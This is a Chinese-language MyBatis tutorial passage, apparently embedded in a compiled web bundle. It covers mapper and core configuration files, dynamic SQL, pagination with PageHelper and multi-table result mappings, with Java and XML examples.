Mybatis的快速入门\n\n**MyBatis开发步骤：**\n\n①添加MyBatis的jar包\n\n②创建Student数据表\n\n③编写Studentr实体类 \n\n④编写映射文件StudentMapper.xml\n\n⑤编写核心文件MyBatisConfig.xml\n\n⑥编写测试类\n\n##### 1.7.1  环境搭建\n\n1)导入MyBatis的jar包\n\n* mysql-connector-java-5.1.37-bin.jar\n* mybatis-3.5.3.jar\n* log4j-1.2.17.jar\n\n2)  创建student数据表\n\n![1590916243454](./img/java/mybatis/mybatis-第1天讲义.img/1590916243454.png)\n\n3) 编写Student实体\n\n```java\npublic class Student {\n    private Integer id;\n    private String name;\n    private Integer age;\n    //省略get个set方法\n}\n```\n\n4)编写StudentMapper.xml映射文件\n\n```xml\n<?xml version="1.0" encoding="UTF-8" ?>\n\x3c!--MyBatis的DTD约束--\x3e\n<!DOCTYPE mapper\n        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"\n        "http://mybatis.org/dtd/mybatis-3-mapper.dtd">\n\n\x3c!--\n    mapper：核心根标签\n    namespace属性：名称空间\n--\x3e\n<mapper namespace="StudentMapper">\n    \x3c!--\n        select：查询功能的标签\n        id属性：唯一标识\n        resultType属性：指定结果映射对象类型\n        parameterType属性：指定参数映射对象类型\n    --\x3e\n    <select id="selectAll" resultType="student">\n        SELECT * FROM student\n    </select>\n\n    <select id="selectById" resultType="student" parameterType="int">\n        SELECT * FROM student WHERE id = #{id}\n    </select>\n\n    <insert id="insert" parameterType="student">\n        INSERT INTO student VALUES (#{id},#{name},#{age})\n    </insert>\n\n    <update id="update" parameterType="student">\n        UPDATE student SET name = #{name},age = #{age} WHERE id = #{id}\n    </update>\n\n    <delete id="delete" parameterType="int">\n        DELETE FROM student WHERE id = #{id}\n    </delete>\n</mapper>\n```\n\n5) 编写MyBatis核心文件\n\n```xml\n<?xml version="1.0" encoding="UTF-8" ?>\n\x3c!--MyBatis的DTD约束--\x3e\n<!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN" "http://mybatis.org/dtd/mybatis-3-config.dtd">\n\n\x3c!--configuration 核心根标签--\x3e\n<configuration>\n\n    \x3c!--引入数据库连接的配置文件--\x3e\n    <properties resource="jdbc.properties"/>\n\n    \x3c!--配置LOG4J--\x3e\n    <settings>\n        <setting name="logImpl" value="log4j"/>\n    </settings>\n\n    \x3c!--起别名--\x3e\n    <typeAliases>\n        <typeAlias type="com.itheima.bean.Student" alias="student"/>\n        \x3c!--<package name="com.itheima.bean"/>--\x3e\n    </typeAliases>\n\n    \x3c!--environments配置数据库环境，环境可以有多个。default属性指定使用的是哪个--\x3e\n    <environments default="mysql">\n        \x3c!--environment配置数据库环境  id属性唯一标识--\x3e\n        <environment id="mysql">\n            \x3c!-- transactionManager事务管理。  type属性，采用JDBC默认的事务--\x3e\n            <transactionManager type="JDBC"></transactionManager>\n            \x3c!-- dataSource数据源信息   type属性 连接池--\x3e\n            <dataSource type="POOLED">\n                \x3c!-- property获取数据库连接的配置信息 --\x3e\n                <property name="driver" value="${driver}" />\n                <property name="url" value="${url}" />\n                <property name="username" value="${username}" />\n                <property name="password" value="${password}" />\n            </dataSource>\n        </environment>\n    </environments>\n\n    \x3c!-- mappers引入映射配置文件 --\x3e\n    <mappers>\n        \x3c!-- mapper 引入指定的映射配置文件   resource属性指定映射配置文件的名称 --\x3e\n        <mapper resource="StudentMapper.xml"/>\n    </mappers>\n</configuration>\n\n```\n##### 1.7.2编写dao代码\n```java\n\n    /*\n        查询全部\n     */\n    @Test\n    public void selectAll() throws Exception{\n        //1.加载核心配置文件\n        //InputStream is = Resources.getResourceAsStream("MyBatisConfig.xml");\n        InputStream is = StudentTest01.class.getClassLoader().getResourceAsStream("MyBatisConfig.xml");\n\n        //2.获取SqlSession工厂对象\n        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\n\n        //3.通过SqlSession工厂对象获取SqlSession对象\n        SqlSession sqlSession = sqlSessionFactory.openSession();\n\n        //4.执行映射配置文件中的sql语句，并接收结果\n        List<Student> list = sqlSession.selectList("StudentMapper.selectAll");\n\n        //5.处理结果\n        for (Student stu : list) {\n            System.out.println(stu);\n        }\n\n        //6.释放资源\n        sqlSession.close();\n        is.close();\n    }\n/*\n        新增功能\n     */\n    @Test\n    public void insert() throws Exception{\n        //1.加载核心配置文件\n        InputStream is = Resources.getResourceAsStream("MyBatisConfig.xml");\n\n        //2.获取SqlSession工厂对象\n        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\n\n        //3.通过工厂对象获取SqlSession对象\n        //SqlSession sqlSession = sqlSessionFactory.openSession();\n        SqlSession sqlSession = sqlSessionFactory.openSession(true);\n\n        //4.执行映射配置文件中的sql语句，并接收结果\n        Student stu = new Student(5,"周七",27);\n        int result = sqlSession.insert("StudentMapper.insert", stu);\n\n        //5.提交事务\n        //sqlSession.commit();\n\n        //6.处理结果\n        System.out.println(result);\n\n        //7.释放资源\n        sqlSession.close();\n        is.close();\n    }    \n\n```\n\n##### 1.7.3编写测试代码\n\n```java\n/*\n    控制层测试类\n */\npublic class StudentController {\n    //创建业务层对象\n    private StudentService service = new StudentServiceImpl();\n\n    //查询全部功能测试\n    @Test\n    public void selectAll() {\n        List<Student> students = service.selectAll();\n        for (Student stu : students) {\n            System.out.println(stu);\n        }\n    }\n}\n```\n\n#### 1.8 知识小结\n\n* 框架       \n\n   框架是一款半成品软件，我们可以基于框架继续开发，从而完成一些个性化的需求。\n\n* ORM        \n\n  对象关系映射，数据和实体对象的映射。\n\n* MyBatis       \n\n   是一个优秀的基于 Java 的持久层框架，它内部封装了 JDBC。\n\n  \n\n### 二. MyBatis的相关api\n\n#### 2.1 Resources\n\n* org.apache.ibatis.io.Resources：加载资源的工具类。\n\n* 核心方法\n\n  ![1590917572321](./img/java/mybatis/mybatis-第1天讲义.img/1590917572321.png)\n\n#### 2.2 构建器SqlSessionFactoryBuilder\n\n* org.apache.ibatis.session.SqlSessionFactoryBuilder：获取 SqlSessionFactory 工厂对象的功能类\n\n* 核心方法\n\n  ![1590916852504](./img/java/mybatis/mybatis-第1天讲义.img/1590916852504.png)\n\n* 通过加载mybatis的核心文件的输入流的形式构建一个SqlSessionFactory对象\n\n```java\nString resource = "org/mybatis/builder/mybatis-config.xml"; \nInputStream inputStream = Resources.getResourceAsStream(resource); \nSqlSessionFactoryBuilder builder = new SqlSessionFactoryBuilder(); \nSqlSessionFactory factory = builder.build(inputStream);\n```\n\n其中， Resources 工具类，这个类在 org.apache.ibatis.io 包中。Resources 类帮助你从类路径下、文件系统或一个 web URL 中加载资源文件。\n\n#### 2.3 工厂对象SqlSessionFactory\n\n* org.apache.ibatis.session.SqlSessionFactory：获取 SqlSession 构建者对象的工厂接口。\n\n* 核心api\n\n  ![1590917006637](./img/java/mybatis/mybatis-第1天讲义.img/1590917006637.png)\n\n\n\n#### 2.4 SqlSession会话对象\n\n* org.apache.ibatis.session.SqlSession：构建者对象接口。用于执行 SQL、管理事务、接口代理。\n\n* 核心api\n\n  ![1590917052849](./img/java/mybatis/mybatis-第1天讲义.img/1590917052849.png)\n\nSqlSession 实例在 MyBatis 中是非常强大的一个类。在这里你会看到所有执行语句、提交或回滚事务和获取映射器实例的方法。\n\n### 三.MyBatis 映射配置文件\n\n#### 3.1 映射配置文件介绍\n\n* 映射配置文件包含了数据和对象之间的映射关系以及要执行的 SQL 语句\n\n  ![1590917306615](./img/java/mybatis/mybatis-第1天讲义.img/1590917306615.png)\n\n\n\n#### 3.2 查询功能\n\n*  select：查询功能标签。\n\n* 属性        \n\n   id：唯一标识， 配合名称空间使用。     \n\n   parameterType：指定参数映射的对象类型。       \n\n   resultType：指定结果映射的对象类型。\n\n* SQL 获取参数:        #{属性名}\n\n* 示例\n\n  ![1590917699865](./img/java/mybatis/mybatis-第1天讲义.img/1590917699865.png)\n\n####3.3 新增功能 \n\n- insert：新增功能标签。\n\n- 属性        \n\n  id：唯一标识， 配合名称空间使用。     \n\n  parameterType：指定参数映射的对象类型。       \n\n  resultType：指定结果映射的对象类型。\n\n- SQL 获取参数:        #{属性名}\n\n* 示例\n\n![1590918390112](./img/java/mybatis/mybatis-第1天讲义.img/1590918390112.png)\n\n\n\n#### 3.4 修改功能\n\n- update：修改功能标签。\n\n- 属性        \n\n  id：唯一标识， 配合名称空间使用。     \n\n  parameterType：指定参数映射的对象类型。       \n\n  resultType：指定结果映射的对象类型。\n\n- SQL 获取参数:        #{属性名}\n\n* 示例\n\n![1590918538863](./img/java/mybatis/mybatis-第1天讲义.img/1590918538863.png)\n\n#### 3.5 删除功能\n\n- delete：查询功能标签。\n\n- 属性        \n\n  id：唯一标识， 配合名称空间使用。     \n\n  parameterType：指定参数映射的对象类型。       \n\n  resultType：指定结果映射的对象类型。\n\n- SQL 获取参数:        #{属性名}\n\n* 示例\n\n  ![1590918458329](./img/java/mybatis/mybatis-第1天讲义.img/1590918458329.png)\n\n* 总结： 大家可以发现crud操作，除了标签名称以及sql语句不一样之外，其他属性参数基本一致。\n\n#### 3.6 映射配置文件小结\n\n\n\n![1590918743943](./img/java/mybatis/mybatis-第1天讲义.img/1590918743943.png)\n\n### 四.Mybatis核心配置文件介绍\n\n#### 4.1 核心配置文件介绍\n\n核心配置文件包含了 MyBatis 最核心的设置和属性信息。如数据库的连接、事务、连接池信息等。\n\n如下图:\n\n~~~xml\n<?xml version="1.0" encoding="UTF-8" ?>\n\x3c!--MyBatis的DTD约束--\x3e\n<!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN" "http://mybatis.org/dtd/mybatis-3-config.dtd">\n\n\x3c!--configuration 核心根标签--\x3e\n<configuration>\n\n    \x3c!--environments配置数据库环境，环境可以有多个。default属性指定使用的是哪个--\x3e\n    <environments default="mysql">\n        \x3c!--environment配置数据库环境  id属性唯一标识--\x3e\n        <environment id="mysql">\n            \x3c!-- transactionManager事务管理。  type属性，采用JDBC默认的事务--\x3e\n            <transactionManager type="JDBC"></transactionManager>\n            \x3c!-- dataSource数据源信息   type属性 连接池--\x3e\n            <dataSource type="POOLED">\n                \x3c!-- property获取数据库连接的配置信息 --\x3e\n                <property name="driver" value="com.mysql.jdbc.Driver" />\n                <property name="url" value="jdbc:mysql:///db1" />\n                <property name="username" value="root" />\n                <property name="password" value="root" />\n            </dataSource>\n        </environment>\n    </environments>\n\n    \x3c!-- mappers引入映射配置文件 --\x3e\n    <mappers>\n        \x3c!-- mapper 引入指定的映射配置文件   resource属性指定映射配置文件的名称 --\x3e\n        <mapper resource="StudentMapper.xml"/>\n    </mappers>\n</configuration>\n~~~\n\n#### 4.2 数据库连接配置文件引入\n\n* properties标签引入外部文件\n\n  ~~~xml\n      \x3c!--引入数据库连接的配置文件--\x3e\n      <properties resource="jdbc.properties"/>\n  ~~~\n\n* 具体使用，如下配置\n\n  ~~~xml\n    \x3c!-- property获取数据库连接的配置信息 --\x3e\n      <property name="driver" value="${driver}" />\n      <property name="url" value="${url}" />\n      <property name="username" value="${username}" />\n      <property name="password" value="${password}" />\n  ~~~\n\n  \n\n#### 4.3 起别名\n\n* <typeAliases>：为全类名起别名的父标签。\n\n* <typeAlias>：为全类名起别名的子标签。\n\n* 属性      \n\n   type：指定全类名      \n\n   alias：指定别名\n\n* <package>：为指定包下所有类起别名的子标签。(别名就是类名)\n\n* 如下图：\n\n  ![1590919106324](./img/java/mybatis/mybatis-第1天讲义.img/1590919106324.png)\n\n* 具体如下配置\n\n  ~~~xml\n      \x3c!--起别名--\x3e\n      <typeAliases>\n          <typeAlias type="com.itheima.bean.Student" alias="student"/>\n          \x3c!--<package name="com.itheima.bean"/>--\x3e\n      </typeAliase\n  ~~~\n\n#### 4.4 总结\n```xml\n核心配置文件包含了MyBatis.最核心的设置和属性信息。如数据库的连接、事务、连接池信息等。\n\n<configuration> :核心根标签。\n<properties> :引入数据库连接信息配置文件标签。\n<typeAliases> :起别名标签。\n<environments>:配置数据库环境标签。\n<environment>:配置数据库信息标签。\n<transactionManager>︰事务管理标签。\n<dataSource>︰数据源标签。\n<property>:数据库连接信息标签。\n<mappers> :引入映射配置文件标签。\n\n```\n\n \n\n### 五.Mybatis传统方式开发\n\n#### 5.1 Dao 层传统实现方式\n\n* 分层思想：控制层(controller)、业务层(service)、持久层(dao)。\n\n* 调用流程\n\n  ![1590919558066](./img/java/mybatis/mybatis-第1天讲义.img/1590919558066.png)\n\n#### 5.2 LOG4J的配置和使用\n\n* 在日常开发过程中，排查问题时难免需要输出 MyBatis 真正执行的 SQL 语句、参数、结果等信息，我们就可以借助 LOG4J 的功能来实现执行信息的输出。\n\n* 使用步骤：\n\n  ![1590919638466](./img/java/mybatis/mybatis-第1天讲义.img/1590919638466.png)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n',Mt={data:function(){return{MainComponent:jt}}},Rt=Mt,Lt=Object(u["a"])(Rt,kt,Ct,!1,null,"6cfc0ffb",null),Ot=Lt.exports,At=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},It=[],Dt='\x3c!--\n * @Date           : 2021-04-14 00:54:32\n * @FilePath       : /jinnian-space/src/pages/java/module/mybatis/md/mybatis-第2天讲义.md\n * @Description    : \n--\x3e\n## Mybatis 进阶\n\n\n### 一.接口代理方式实现Dao\n\n#### 1.1 代理开发方式介绍\n\n​\t采用 Mybatis 的代理开发方式实现 DAO 层的开发，这种方式是我们后面进入企业的主流。\n\nMapper 接口开发方法只需要程序员编写Mapper 接口（相当于Dao 接口），由Mybatis 框架根据接口定义创建接口的动态代理对象，代理对象的方法体同上边Dao接口实现类方法。\n\nMapper 接口开发需要遵循以下规范：\n\n**1) Mapper.xml文件中的namespace与mapper接口的全限定名相同**\n\n**2) Mapper接口方法名和Mapper.xml中定义的每个statement的id相同**\n\n**3) Mapper接口方法的输入参数类型和mapper.xml中定义的每个sql的parameterType的类型相同**\n\n**4) Mapper接口方法的输出参数类型和mapper.xml中定义的每个sql的resultType的类型相同**\n\n总结: \n\n接口开发的方式: 程序员只需定义接口,就可以对数据库进行操作,那么具体的对象怎么创建?\n\n1.程序员负责定义接口\n\n2.在操作数据库,mybatis框架根据接口,通过动态代理的方式生成代理对象,负责数据库的crud操作\n\n#### 1.2.编写StudentMapper接口\n\n![1590937589503](./img/java/mybatis/mybatis-第2天讲义.img/1590937589503.png)\n\n#### 1.3 测试代理方式\n\n```java\n public Student selectById(Integer id) {\n        Student stu = null;\n        SqlSession sqlSession = null;\n        InputStream is = null;\n        try{\n            //1.加载核心配置文件\n            is = Resources.getResourceAsStream("MyBatisConfig.xml");\n\n            //2.获取SqlSession工厂对象\n            SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\n\n            //3.通过工厂对象获取SqlSession对象\n            sqlSession = sqlSessionFactory.openSession(true);\n\n            //4.获取StudentMapper接口的实现类对象\n            StudentMapper mapper = sqlSession.getMapper(StudentMapper.class); // StudentMapper mapper = new StudentMapperImpl();\n\n            //5.通过实现类对象调用方法，接收结果\n            stu = mapper.selectById(id);\n\n        } catch (Exception e) {\n\n        } finally {\n            //6.释放资源\n            if(sqlSession != null) {\n                sqlSession.close();\n            }\n            if(is != null) {\n                try {\n                    is.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        //7.返回结果\n        return stu;\n    }\n```\n\n#### 1.4 源码分析\n\n* 分析动态代理对象如何生成的？ \n\n  通过动态代理开发模式，我们只编写一个接口，不写实现类，我们通过 getMapper() 方法最终获取到 org.apache.ibatis.binding.MapperProxy 代理对象，然后执行功能，而这个代理对象正是 MyBatis 使用了 JDK 的动态代理技术，帮助我们生成了代理实现类对象。从而可以进行相关持久化操作。 \n\n* 分析方法是如何执行的？\n\n   动态代理实现类对象在执行方法的时候最终调用了 mapperMethod.execute() 方法，这个方法中通过 switch 语句根据操作类型来判断是新增、修改、删除、查询操作，最后一步回到了 MyBatis 最原生的 SqlSession 方式来执行增删改查。    \n\n#### 1.5 知识小结\n\n 接口代理方式可以让我们只编写接口即可，而实现类对象由 MyBatis 生成。 \n\n 实现规则 ：\n\n1. 映射配置文件中的名称空间必须和 Dao 层接口的全类名相同。\n2. 映射配置文件中的增删改查标签的 id 属性必须和 Dao 层接口的方法名相同。 \n3. 映射配置文件中的增删改查标签的 parameterType 属性必须和 Dao 层接口方法的参数相同。 \n4. 映射配置文件中的增删改查标签的 resultType 属性必须和 Dao 层接口方法的返回值相同。 \n5. 获取动态代理对象 SqlSession 功能类中的 getMapper() 方法。    \n\n### 二. 动态sql语句\n\n#### 2.1 动态sql语句概述\n\n​\tMybatis 的映射文件中，前面我们的 SQL 都是比较简单的，有些时候业务逻辑复杂时，我们的 SQL是动态变化的，此时在前面的学习中我们的 SQL 就不能满足要求了。\n\n参考的官方文档，描述如下：\n\n![](img\\图片2.png)\n\n#### 2.2 动态 SQL  之<**if>** \n\n我们根据实体类的不同取值，使用不同的 SQL语句来进行查询。比如在 id如果不为空时可以根据id查询，如果username 不同空时还要加入用户名作为条件。这种情况在我们的多条件组合查询中经常会碰到。\n\n如下图：\n\n```xml\n<select id="findByCondition" parameterType="student" resultType="student">\n    select * from student\n    <where>\n        <if test="id!=0">\n            and id=#{id}\n        </if>\n        <if test="username!=null">\n            and username=#{username}\n        </if>\n    </where>\n</select>\n\n```\n\n当查询条件id和username都存在时，控制台打印的sql语句如下：\n\n```java\n     … … …\n     //获得MyBatis框架生成的StudentMapper接口的实现类\n    StudentMapper mapper = sqlSession.getMapper( StudentMapper.class);\n    Student condition = new Student();\n    condition.setId(1);\n    condition.setUsername("lucy");\n    Student student = mapper.findByCondition(condition);\n    … … …\n```\n\n![1590936579118](./img/java/mybatis/mybatis-第2天讲义.img/1590936579118.png)\n\n\n\n当查询条件只有id存在时，控制台打印的sql语句如下：\n\n```java\n … … …\n //获得MyBatis框架生成的UserMapper接口的实现类\n StudentMapper mapper = sqlSession.getMapper( StudentMapper.class);\n    Student condition = new Student();\n    condition.setId(1);\n    Student student = mapper.findByCondition(condition);\n… … …\n\n```\n\n![1590936654661](./img/java/mybatis/mybatis-第2天讲义.img/1590936654661.png)\n\n总结语法:\n\n~~~xml\n<where>：条件标签。如果有动态条件，则使用该标签代替 where 关键字。\n<if>：条件判断标签。\n<if test=“条件判断”>\n\t查询条件拼接\n</if>\n~~~\n\n\n\n#### 2.3  动态 SQL  之<**foreach>** \n\n循环执行sql的拼接操作，例如：SELECT * FROM student  WHERE id IN (1,2,5)。\n\n ```xml\n<select id="findByIds" parameterType="list" resultType="student">\n    select * from student\n    <where>\n        <foreach collection="array" open="id in(" close=")" item="id" separator=",">\n            #{id}\n        </foreach>\n    </where>\n</select>\n ```\n\n测试代码片段如下：\n\n```java\n … … …\n //获得MyBatis框架生成的UserMapper接口的实现类\nStudentMapper mapper = sqlSession.getMapper(StudentMapper.class);\nint[] ids = new int[]{2,5};\nList<Student> sList = mapper.findByIds(ids);\nSystem.out.println(sList);\n… … …\n\n```\n\n总结语法:\n\n~~~xml\n<foreach>：循环遍历标签。适用于多个参数或者的关系。\n    <foreach collection=“”open=“”close=“”item=“”separator=“”>\n\t\t获取参数\n\t</foreach>\n~~~\n\n属性\ncollection：参数容器类型， (list-集合， array-数组)。\nopen：开始的 SQL 语句。\nclose：结束的 SQL 语句。\nitem：参数变量名。\nseparator：分隔符。\n\n#### 2.4  SQL片段抽取\n\nSql 中可将重复的 sql 提取出来，使用时用 include 引用即可，最终达到 sql 重用的目的\n\n```xml\n\x3c!--抽取sql片段简化编写--\x3e\n<sql id="selectStudent" select * from student</sql>\n<select id="findById" parameterType="int" resultType="student">\n    <include refid="selectStudent"></include> where id=#{id}\n</select>\n<select id="findByIds" parameterType="list" resultType="student">\n    <include refid="selectStudent"></include>\n    <where>\n        <foreach collection="array" open="id in(" close=")" item="id" separator=",">\n            #{id}\n        </foreach>\n    </where>\n</select>\n```\n\n总结语法:\n\n我们可以将一些重复性的 SQL 语句进行抽取，以达到复用的效果。 \n\n~~~xml\n-  <sql>：抽取 SQL 语句标签。 \n-  <include>：引入 SQL 片段标签。 \n   <sql id=“片段唯一标识”>抽取的 SQL 语句</sql> <include refid=“片段唯一标识”/>\n \n~~~\n\n#### 2.5 知识小结\n\nMyBatis映射文件配置：\n\n~~~xml\n<select>：查询\n\n<insert>：插入\n\n<update>：修改\n\n<delete>：删除\n\n<where>：where条件\n\n<if>：if判断\n\n<foreach>：循环\n\n<sql>：sql片段抽取\n\n~~~\n\n\n\n### 三. 分页插件\n\n#### 3.1 分页插件介绍\n\n![1590937779260](./img/java/mybatis/mybatis-第2天讲义.img/1590937779260.png)\n\n* 分页可以将很多条结果进行分页显示。 \n*  如果当前在第一页，则没有上一页。如果当前在最后一页，则没有下一页。 \n*  需要明确当前是第几页，这一页中显示多少条结果。    \n* MyBatis分页插件总结\n  1. 在企业级开发中，分页也是一种常见的技术。而目前使用的 MyBatis 是不带分页功能的，如果想实现分页的 功能，需要我们手动编写 LIMIT 语句。但是不同的数据库实现分页的 SQL 语句也是不同的，所以手写分页 成本较高。这个时候就可以借助分页插件来帮助我们实现分页功能。 \n  2. PageHelper：第三方分页助手。将复杂的分页操作进行封装，从而让分页功能变得非常简单。    \n\n#### 3.2 分页插件的使用\n\nMyBatis可以使用第三方的插件来对功能进行扩展，分页助手PageHelper是将分页的复杂操作进行封装，使用简单的方式即可获得分页的相关数据\n\n开发步骤：\n\n①导入与PageHelper的jar包\n\n②在mybatis核心配置文件中配置PageHelper插件\n\n~~~xml\n\x3c!-- 注意：分页助手的插件  配置在通用mapper之前 --\x3e\n<plugin interceptor="com.github.pagehelper.PageHelper">\n    \x3c!-- 指定方言 --\x3e\n    <property name="dialect" value="mysql"/>\n</plugin>\n~~~\n\n③测试分页数据获取\n\n~~~java\n@Test\npublic void testPageHelper(){\n    //设置分页参数\n    PageHelper.startPage(1,2);\n\n    List<User> select = userMapper2.select(null);\n    for(User user : select){\n        System.out.println(user);\n    }\n}\n~~~\n\n#### 3.3 分页插件的参数获取\n\n**获得分页相关的其他参数**：\n\n```java\n//其他分页的数据\nPageInfo<User> pageInfo = new PageInfo<User>(select);\nSystem.out.println("总条数："+pageInfo.getTotal());\nSystem.out.println("总页数："+pageInfo.getPages());\nSystem.out.println("当前页："+pageInfo.getPageNum());\nSystem.out.println("每页显示长度："+pageInfo.getPageSize());\nSystem.out.println("是否第一页："+pageInfo.isIsFirstPage());\nSystem.out.println("是否最后一页："+pageInfo.isIsLastPage());\n\n```\n\n#### 3.4  分页插件知识小结\n\n​    分页：可以将很多条结果进行分页显示。 \n\n* 分页插件 jar 包： pagehelper-5.1.10.jar jsqlparser-3.1.jar \n\n*  plugins：集成插件标签。 \n\n* 分页助手相关 API \n\n  ​    1.PageHelper：分页助手功能类。\n\n  2. startPage()：设置分页参数 \n  3. PageInfo：分页相关参数功能类。 \n  4. getTotal()：获取总条数 \n  5. getPages()：获取总页数\n  6.  getPageNum()：获取当前页\n  7.  getPageSize()：获取每页显示条数\n  8.  getPrePage()：获取上一页 \n  9. getNextPage()：获取下一页 \n  10. isIsFirstPage()：获取是否是第一页 \n  11. isIsLastPage()：获取是否是最后一页    \n\n### 四.MyBatis的多表操作\n\n#### 4.1 多表模型介绍\n\n我们之前学习的都是基于单表操作的，而实际开发中，随着业务难度的加深，肯定需要多表操作的。 \n\n*  多表模型分类 一对一：在任意一方建立外键，关联对方的主键。\n*  一对多：在多的一方建立外键，关联一的一方的主键。\n*  多对多：借助中间表，中间表至少两个字段，分别关联两张表的主键。    \n\n#### 4.2 多表模型一对一操作\n\n1. 一对一模型： 人和身份证，一个人只有一个身份证\n\n2. 代码实现\n\n   * 步骤一: sql语句准备\n\n     ~~~sql\n     CREATE TABLE person(\n     \tid INT PRIMARY KEY AUTO_INCREMENT,\n     \tNAME VARCHAR(20),\n     \tage INT\n     );\n     INSERT INTO person VALUES (NULL,\'张三\',23);\n     INSERT INTO person VALUES (NULL,\'李四\',24);\n     INSERT INTO person VALUES (NULL,\'王五\',25);\n     \n     CREATE TABLE card(\n     \tid INT PRIMARY KEY AUTO_INCREMENT,\n     \tnumber VARCHAR(30),\n     \tpid INT,\n     \tCONSTRAINT cp_fk FOREIGN KEY (pid) REFERENCES person(id)\n     );\n     INSERT INTO card VALUES (NULL,\'12345\',1);\n     INSERT INTO card VALUES (NULL,\'23456\',2);\n     INSERT INTO card VALUES (NULL,\'34567\',3);\n     ~~~\n\n   * 步骤二:配置文件\n\n     ~~~xml\n     <?xml version="1.0" encoding="UTF-8" ?>\n     <!DOCTYPE mapper\n             PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"\n             "http://mybatis.org/dtd/mybatis-3-mapper.dtd">\n     \n     <mapper namespace="com.itheima.table01.OneToOneMapper">\n         \x3c!--配置字段和实体对象属性的映射关系--\x3e\n         <resultMap id="oneToOne" type="card">\n             <id column="cid" property="id" />\n             <result column="number" property="number" />\n             \x3c!--\n                 association：配置被包含对象的映射关系\n                 property：被包含对象的变量名\n                 javaType：被包含对象的数据类型\n             --\x3e\n             <association property="p" javaType="person">\n                 <id column="pid" property="id" />\n                 <result column="name" property="name" />\n                 <result column="age" property="age" />\n             </association>\n         </resultMap>\n     \n         <select id="selectAll" resultMap="oneToOne">\n             SELECT c.id cid,number,pid,NAME,age FROM card c,person p WHERE c.pid=p.id\n         </select>\n     </mapper>\n     ~~~\n\n   * 步骤三：测试类\n\n     ~~~java\n      @Test\n         public void selectAll() throws Exception{\n             //1.加载核心配置文件\n             InputStream is = Resources.getResourceAsStream("MyBatisConfig.xml");\n     \n             //2.获取SqlSession工厂对象\n             SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\n     \n             //3.通过工厂对象获取SqlSession对象\n             SqlSession sqlSession = sqlSessionFactory.openSession(true);\n     \n             //4.获取OneToOneMapper接口的实现类对象\n             OneToOneMapper mapper = sqlSession.getMapper(OneToOneMapper.class);\n     \n             //5.调用实现类的方法，接收结果\n             List<Card> list = mapper.selectAll();\n     \n             //6.处理结果\n             for (Card c : list) {\n                 System.out.println(c);\n             }\n     \n             //7.释放资源\n             sqlSession.close();\n             is.close();\n         }\n     ~~~\n\n   3.一对一配置总结:\n\n   ~~~xml-dtd\n   <resultMap>：配置字段和对象属性的映射关系标签。\n       id 属性：唯一标识\n       type 属性：实体对象类型\n   <id>：配置主键映射关系标签。\n   <result>：配置非主键映射关系标签。\n       column 属性：表中字段名称\n       property 属性： 实体对象变量名称\n   <association>：配置被包含对象的映射关系标签。\n       property 属性：被包含对象的变量名\n       javaType 属性：被包含对象的数据类型\n   ~~~\n\n   \n\n#### 4.3 多表模型一对多操作\n\n1. 一对多模型： 一对多模型：班级和学生，一个班级可以有多个学生。    \n\n2. 代码实现\n\n   - 步骤一: sql语句准备\n\n     ```sql\n     CREATE TABLE classes(\n     \tid INT PRIMARY KEY AUTO_INCREMENT,\n     \tNAME VARCHAR(20)\n     );\n     INSERT INTO classes VALUES (NULL,\'黑马一班\');\n     INSERT INTO classes VALUES (NULL,\'黑马二班\');\n     \n     \n     CREATE TABLE student(\n     \tid INT PRIMARY KEY AUTO_INCREMENT,\n     \tNAME VARCHAR(30),\n     \tage INT,\n     \tcid INT,\n     \tCONSTRAINT cs_fk FOREIGN KEY (cid) REFERENCES classes(id)\n     );\n     INSERT INTO student VALUES (NULL,\'张三\',23,1);\n     INSERT INTO student VALUES (NULL,\'李四\',24,1);\n     INSERT INTO student VALUES (NULL,\'王五\',25,2);\n     INSERT INTO student VALUES (NULL,\'赵六\',26,2);\n     ```\n\n   - 步骤二:配置文件\n\n     ```xml\n     <mapper namespace="com.itheima.table02.OneToManyMapper">\n         <resultMap id="oneToMany" type="classes">\n             <id column="cid" property="id"/>\n             <result column="cname" property="name"/>\n     \n             \x3c!--\n                 collection：配置被包含的集合对象映射关系\n                 property：被包含对象的变量名\n                 ofType：被包含对象的实际数据类型\n             --\x3e\n             <collection property="students" ofType="student">\n                 <id column="sid" property="id"/>\n                 <result column="sname" property="name"/>\n                 <result column="sage" property="age"/>\n             </collection>\n         </resultMap>\n         <select id="selectAll" resultMap="oneToMany">\n             SELECT c.id cid,c.name cname,s.id sid,s.name sname,s.age sage FROM classes c,student s WHERE c.id=s.cid\n         </select>\n     </mapper>\n     ```\n\n   - 步骤三：测试类\n\n     ```java\n         @Test\n         public void selectAll() throws Exception{\n             //1.加载核心配置文件\n             InputStream is = Resources.getResourceAsStream("MyBatisConfig.xml");\n     \n             //2.获取SqlSession工厂对象\n             SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\n     \n             //3.通过工厂对象获取SqlSession对象\n             SqlSession sqlSession = sqlSessionFactory.openSession(true);\n     \n             //4.获取OneToManyMapper接口的实现类对象\n             OneToManyMapper mapper = sqlSession.getMapper(OneToManyMapper.class);\n     \n             //5.调用实现类的方法，接收结果\n             List<Classes> 